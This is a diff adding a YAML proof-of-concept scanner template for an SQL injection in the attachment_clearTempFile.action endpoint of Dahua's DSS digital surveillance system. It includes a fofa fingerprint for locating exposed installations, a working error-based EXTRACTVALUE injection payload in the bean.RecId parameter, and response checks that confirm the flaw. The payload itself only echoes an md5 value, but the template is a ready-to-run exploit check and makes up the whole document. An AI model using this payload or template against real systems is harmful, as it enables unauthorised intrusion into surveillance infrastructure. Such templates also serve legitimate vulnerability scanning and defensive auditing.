@@ -1,0 +1,24 @@
+id: poc-yaml-dahua-dss-attachment-cleartempfile-sqli
+info:
+  name: 大华 DSS 数字监控系统 attachment_clearTempFile SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大华 DSS 数字监控系统
+  fofa: app="dahua-DSS"
+variables:
+  t1: random_int(10000,99999)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(md5({{.t1}}))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"XPATH syntax error") &&
+
+    contains(body,"org.springframework.jdbc") &&
+
+    contains(body,substr(t2,0,26))
+
+    '
+transport: http
